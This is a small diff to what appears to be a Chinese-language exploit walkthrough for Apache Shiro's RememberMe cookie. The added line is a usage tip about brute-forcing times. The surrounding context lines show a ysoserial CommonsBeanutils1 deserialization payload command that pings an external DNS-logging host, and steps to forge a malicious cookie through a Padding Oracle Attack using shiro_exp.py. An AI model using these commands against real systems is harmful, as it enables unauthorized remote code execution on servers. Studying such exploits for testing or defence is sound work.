@@ -144,7 +144,7 @@ java -jar ysoserial.jar CommonsBeanutils1 "ping 9rtmxe.ceye.io" > payload.class
 
 **3.** 通过 Padding Oracle Attack 生成 Evil Rememberme cookie:
 
-
+> **注意：** 此 exp 爆破时间较长，建议使用 ysoserial 生成较短的 payload 验证（eg: ping 、 touch /tmp/success, etc），约 1 个多小时可生成正确的 rememberme cookie，生成成功后将自动停止运行。
 
 ```
 python shiro_exp.py
